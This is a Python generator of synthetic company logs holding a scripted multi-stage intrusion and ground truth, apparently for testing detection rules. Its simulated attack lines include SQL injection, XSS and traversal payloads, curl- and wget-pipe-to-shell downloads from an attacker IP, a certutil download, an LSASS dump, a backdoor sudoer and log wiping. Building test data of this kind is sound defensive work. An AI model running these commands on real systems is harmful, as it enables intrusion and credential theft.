"""Realistic multi-source log generator with ground truth.

Produces a small company's logs: 7 days of normal activity, then one night with
a multi-stage intrusion (web recon -> SSH brute force -> privilege escalation ->
persistence, plus a Windows password spray -> credential dumping -> log wiping).

Files written:
  auth.log              Linux auth (rsyslog ISO timestamps)
  ufw.log               firewall (UFW)
  access.log            Nginx combined log
  windows_security.jsonl Windows Security / System events as JSON lines
  ground_truth.json     attack stages, time spans and the rules expected to fire
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

TZ = timezone(timedelta(hours=5, minutes=30))
ATTACKER = "45.33.12.7"
PIVOT = "10.10.9.99"
OFFICE = {"alice": "10.10.1.21", "bob": "10.10.1.22", "dave": "10.10.1.24"}
HOME_IPS = {"dave": "49.37.112.5", "bob": "49.205.77.18"}
WIN_USERS = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "mallory", "svc_backup"]
PAGES = ["/", "/products", "/products/{n}", "/cart", "/login", "/static/app.{h}.js", "/static/style.{h}.css",
         "/api/v1/items?page={n}", "/blog/{w}", "/about", "/contact", "/search?q={w}", "/images/{n}.webp"]
WORDS = ["pricing", "laptop", "summer-sale", "shipping", "returns", "headphones", "monitor", "keyboard"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Version/18.1 Mobile/15E148 Safari/604.1",
       "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
       "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"]


class LogGen:
    def __init__(self, seed: int = 1, start: datetime | None = None, days: int = 7):
        self.r = random.Random(seed)
        self.start = start or datetime(2026, 10, 26, 0, 0, tzinfo=TZ)
        self.days = days
        self.auth, self.ufw, self.web, self.win = [], [], [], []
        self.pid = 20000
        self.truth: list[dict] = []

    # ------------------------------------------------------------ formatters
    def _pid(self):
        self.pid += self.r.randint(1, 40); return self.pid

    def sys(self, dt, host, proc, msg, store=None):
        (store if store is not None else self.auth).append((dt, f"{dt.isoformat(timespec='seconds')} {host} {proc}[{self._pid()}]: {msg}"))

    def fw(self, dt, src, dport, action="BLOCK", proto="TCP"):
        self.ufw.append((dt, f"{dt.isoformat(timespec='seconds')} gw01 kernel: [UFW {action}] IN=eth0 OUT= "
                             f"SRC={src} DST=203.0.113.10 LEN=44 TOS=0x00 PROTO={proto} SPT={self.r.randint(1024, 65000)} DPT={dport} WINDOW=1024 SYN"))

    def http(self, dt, ip, method, url, status, size, ua, ref="-"):
        self.web.append((dt, f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S %z")}] "{method} {url} HTTP/1.1" {status} {size} "{ref}" "{ua}"'))

    def wevt(self, dt, eid, computer, **data):
        self.win.append((dt, json.dumps({"@timestamp": dt.astimezone(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z"),
                                         "EventID": eid, "Computer": computer, "EventData": data})))

    def ssh_ok(self, dt, user, ip, host="web01", method="publickey"):
        self.sys(dt, host, "sshd", f"Accepted {method} for {user} from {ip} port {self.r.randint(40000, 65000)} ssh2")

    def ssh_fail(self, dt, user, ip, host="web01", invalid=False):
        if invalid:
            self.sys(dt, host, "sshd", f"Invalid user {user} from {ip} port {self.r.randint(40000, 65000)}")
        self.sys(dt, host, "sshd", f"Failed password for {'invalid user ' if invalid else ''}{user} from {ip} port {self.r.randint(40000, 65000)} ssh2")

    def sudo(self, dt, user, cmd, host="web01", target="root"):
        self.sys(dt, host, "sudo", f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER={target} ; COMMAND={cmd}")

    # ------------------------------------------------------------ baseline
    def baseline(self):
        r = self.r
        for d in range(self.days):
            day = self.start + timedelta(days=d)
            weekend = day.weekday() >= 5
            # Linux admins/devs
            for user, (h0, h1) in {"alice": (9, 18), "bob": (8, 19), "dave": (11, 22)}.items():
                if weekend and r.random() < 0.8:
                    continue
                for _ in range(r.randint(2, 5)):
                    t = day + timedelta(hours=r.uniform(h0, h1))
                    ip = OFFICE[user] if (user not in HOME_IPS or r.random() < 0.7) else HOME_IPS[user]
                    if r.random() < 0.08:  # typo then success
                        host = r.choice(["web01", "db01"])
                        self.ssh_fail(t, user, ip, host)
                        self.ssh_ok(t + timedelta(seconds=6), user, ip, host, "password")
                    else:
                        self.ssh_ok(t, user, ip, r.choice(["web01", "db01"]))
                    if user == "bob":
                        for k in range(r.randint(1, 4)):
                            self.sudo(t + timedelta(minutes=k * 3 + 1), "bob", r.choice([
                                "/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -u nginx",
                                "/usr/bin/tail -n 100 /var/log/nginx/error.log", "/usr/bin/docker ps"]))
                    if user == "dave" and r.random() < 0.3:
                        self.sudo(t + timedelta(minutes=2), "dave", "/usr/bin/systemctl status postgresql", host="db01")
            for h in (2, 14):  # cron jobs
                self.sys(day + timedelta(hours=h, minutes=17), "web01", "CRON", "(root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)")
            # Web traffic
            for _ in range(r.randint(1500, 2500)):
                t = day + timedelta(seconds=r.betavariate(2.2, 2) * 86400)
                ip = f"{r.choice([49, 103, 106, 117, 152, 157, 182, 223])}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}"
                url = r.choice(PAGES).replace("{n}", str(r.randint(1, 400))).replace("{w}", r.choice(WORDS)).replace("{h}", "3f9a1c")
                status = 404 if r.random() < 0.02 else (302 if url == "/login" and r.random() < .3 else 200)
                self.http(t, ip, "POST" if url == "/login" and r.random() < .3 else "GET", url, status, r.randint(300, 90000), r.choice(UAS))
            # Firewall background noise (internet scanners, a couple of ports each)
            for _ in range(r.randint(40, 80)):
                t = day + timedelta(seconds=r.uniform(0, 86400))
                ip = f"{r.randint(1, 223)}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}"
                for _ in range(r.randint(1, 3)):
                    self.fw(t, ip, r.choice([23, 445, 3389, 8080, 22, 5900, 1433, 6379])); t += timedelta(seconds=r.uniform(1, 30))
            # Windows: workstation + domain controller
            for user in WIN_USERS[:-2]:
                if weekend and r.random() < 0.85:
                    continue
                t = day + timedelta(hours=r.uniform(8.5, 10.5))
                ws = f"WS-{user.upper()}"
                if r.random() < 0.1:
                    self.wevt(t - timedelta(seconds=20), 4625, "DC01", TargetUserName=user, IpAddress=f"10.10.3.{WIN_USERS.index(user) + 10}", LogonType=2)
                self.wevt(t, 4624, "DC01", TargetUserName=user, IpAddress=f"10.10.3.{WIN_USERS.index(user) + 10}", LogonType=2)
                for proc in r.sample(["chrome.exe", "OUTLOOK.EXE", "EXCEL.EXE", "Teams.exe", "code.exe", "explorer.exe"], 3):
                    self.wevt(t + timedelta(minutes=r.uniform(1, 60)), 4688, ws, SubjectUserName=user,
                              NewProcessName=f"C:\\Program Files\\App\\{proc}", CommandLine=proc, ParentProcessName="explorer.exe")
                if user == "grace" and r.random() < 0.5:  # IT admin uses PowerShell normally
                    self.wevt(t + timedelta(hours=2), 4688, ws, SubjectUserName=user, NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                              CommandLine="powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1")
                self.wevt(t + timedelta(hours=r.uniform(7, 9)), 4634, "DC01", TargetUserName=user)
            # service account: nightly backup at 01:00 — off-hours but NORMAL (hard negative for UEBA)
            t = day + timedelta(hours=1, minutes=r.randint(0, 5))
            self.wevt(t, 4624, "DC01", TargetUserName="svc_backup", IpAddress="10.10.2.30", LogonType=5)
            self.wevt(t + timedelta(minutes=40), 4634, "DC01", TargetUserName="svc_backup")

    # ------------------------------------------------------------ attack night
    def stage(self, name, start, end, rules, description):
        self.truth.append({"stage": name, "start": start.timestamp(), "end": end.timestamp(),
                           "expected_rules": rules, "description": description})

    def attack(self):
        r = self.r
        day = self.start + timedelta(days=self.days)
        t0 = day + timedelta(hours=2, minutes=7)
        nikto = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"

        # A. web recon + exploitation attempts
        t = t0
        for p in ["/admin", "/backup.zip", "/.git/config", "/phpmyadmin/", "/wp-login.php", "/server-status", "/config.php.bak",
                  "/test", "/old", "/db.sql", "/console", "/actuator/env", "/.DS_Store", "/cgi-bin/test.cgi"] * 3:
            self.http(t, ATTACKER, "GET", p + ("" if r.random() < .5 else f"?{r.randint(1, 99)}"), 404, 162, nikto); t += timedelta(seconds=r.uniform(0.2, 1.2))
        self.http(t, ATTACKER, "GET", "/.env", 200, 811, nikto); t += timedelta(seconds=2)
        sqlmap = "sqlmap/1.8.11#stable (https://sqlmap.org)"
        for payload in ["1%27%20OR%20%271%27%3D%271", "1%20UNION%20SELECT%20username,password%20FROM%20users--",
                        "1%27%20AND%20SLEEP(5)--%20-", "1%3B%20DROP%20TABLE%20users"]:
            self.http(t, ATTACKER, "GET", f"/products?id={payload}", 500, 312, sqlmap); t += timedelta(seconds=3)
        self.http(t, ATTACKER, "GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", 200, 5120, UAS[0]); t += timedelta(seconds=2)
        self.http(t, ATTACKER, "GET", "/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd", 400, 98, UAS[0]); t += timedelta(seconds=2)
        self.http(t, ATTACKER, "GET", "/uploads/shell.php?cmd=whoami", 404, 162, UAS[0]); t += timedelta(seconds=2)
        self.stage("Web reconnaissance & exploitation attempts", t0, t, ["LH-W01", "LH-W02", "LH-W03", "LH-W04", "LH-W05", "LH-W06", "LH-W07"],
                   "Nikto content discovery, exposed .env, sqlmap SQL injection, XSS, path traversal, web shell probe")

        # B. port scan
        tb = t + timedelta(minutes=1); t = tb
        for port in r.sample(range(1, 10000), 60):
            self.fw(t, ATTACKER, port); t += timedelta(seconds=r.uniform(0.2, 1.5))
        self.stage("Network port scan", tb, t, ["LH-F01"], "SYN scan of 60 ports against the perimeter")

        # C. SSH brute force -> success
        tc = t + timedelta(minutes=2); t = tc
        for _ in range(42):
            u = r.choice(["root", "admin", "test", "oracle", "ubuntu", "bob", "deploy", "git"])
            self.ssh_fail(t, u, ATTACKER, invalid=u in ("admin", "test", "oracle", "deploy", "git")); t += timedelta(seconds=r.uniform(1, 4))
        self.ssh_ok(t, "bob", ATTACKER, method="password")
        self.stage("SSH brute force and account compromise", tc, t, ["LH-L01", "LH-L02", "LH-L03"],
                   "42 password guesses, then successful login as bob from the attacker IP")

        # D. post-exploitation on web01
        td = t + timedelta(minutes=1); t = td
        for cmd in ["/usr/bin/id", "/usr/bin/cat /etc/shadow", "/usr/sbin/useradd -m -s /bin/bash backdoor"]:
            self.sudo(t, "bob", cmd); t += timedelta(seconds=r.uniform(20, 60))
        self.sys(t, "web01", "useradd", "new user: name=backdoor, UID=1007, GID=1007, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0"); t += timedelta(seconds=30)
        self.sudo(t, "bob", "/usr/sbin/usermod -aG sudo backdoor"); t += timedelta(seconds=1)
        self.sys(t, "web01", "usermod", "add 'backdoor' to group 'sudo'"); t += timedelta(seconds=40)
        self.sudo(t, "bob", f"/bin/bash -c curl -s http://{ATTACKER}/x.sh | bash"); t += timedelta(seconds=50)
        self.sudo(t, "bob", "/usr/bin/crontab -l"); t += timedelta(seconds=20)
        self.sys(t, "web01", "CRON", f"(root) CMD (wget -q -O- http://{ATTACKER}/beacon | sh)")
        self.stage("Privilege escalation & persistence on Linux", td, t, ["LH-L05", "LH-L06", "LH-L07", "LH-L08", "LH-L10", "LH-U01"],
                   "Read /etc/shadow, create 'backdoor' sudoer, download-and-execute, cron beacon")

        # E. Windows: spray -> success -> execution -> creds -> persistence -> anti-forensics
        te = t + timedelta(minutes=12); t = te
        for u in WIN_USERS:
            for _ in range(r.randint(1, 2)):
                self.wevt(t, 4625, "DC01", TargetUserName=u, IpAddress=PIVOT, LogonType=3); t += timedelta(seconds=r.uniform(2, 8))
        self.wevt(t, 4624, "DC01", TargetUserName="svc_backup", IpAddress=PIVOT, LogonType=3); t += timedelta(minutes=1)
        enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
        steps = [
            (4688, dict(SubjectUserName="svc_backup", NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        CommandLine=f"powershell.exe -nop -w hidden -enc {enc}", ParentProcessName="C:\\Windows\\System32\\wmiprvse.exe")),
            (4688, dict(SubjectUserName="svc_backup", NewProcessName="C:\\Windows\\System32\\certutil.exe",
                        CommandLine=f"certutil.exe -urlcache -split -f http://{ATTACKER}/p.exe C:\\Users\\Public\\p.exe")),
            (4688, dict(SubjectUserName="svc_backup", NewProcessName="C:\\Users\\Public\\procdump64.exe",
                        CommandLine="procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l.dmp")),
            (4720, dict(SubjectUserName="svc_backup", TargetUserName="helpdesk2")),
            (4732, dict(SubjectUserName="svc_backup", MemberName="CN=helpdesk2,CN=Users,DC=corp,DC=local", TargetUserName="Administrators")),
            (7045, dict(SubjectUserName="svc_backup", ServiceName="WinUpdateSvc", ServiceFileName="C:\\Users\\Public\\p.exe -k")),
            (1102, dict(SubjectUserName="svc_backup")),
        ]
        for eid, data in steps:
            self.wevt(t, eid, "DC01", **data); t += timedelta(seconds=r.uniform(30, 120))
        self.stage("Windows password spray → credential dumping → persistence → log wiping", te, t,
                   ["LH-WN01", "LH-WN02", "LH-WN10", "LH-WN03", "LH-WN08", "LH-WN09", "LH-WN07", "LH-WN04", "LH-WN06", "LH-WN05"],
                   "Spray from internal pivot, svc_backup compromised, encoded PowerShell, certutil download, LSASS dump, admin account, malicious service, log cleared")

    # ------------------------------------------------------------ output
    @property
    def attack_start(self) -> float:
        return (self.start + timedelta(days=self.days)).timestamp()

    def write(self, out: str | Path, with_attack: bool = True) -> Path:
        self.baseline()
        if with_attack:
            self.attack()
        out = Path(out); out.mkdir(parents=True, exist_ok=True)
        for name, rows in [("auth.log", self.auth), ("ufw.log", self.ufw), ("access.log", self.web), ("windows_security.jsonl", self.win)]:
            (out / name).write_text("\n".join(line for _, line in sorted(rows, key=lambda x: x[0])) + "\n")
        (out / "ground_truth.json").write_text(json.dumps({"attack_start": self.attack_start, "stages": self.truth}, indent=2))
        return out


if __name__ == "__main__":
    import sys
    p = LogGen().write(sys.argv[1] if len(sys.argv) > 1 else "samples/scenario")
    print("wrote", p)
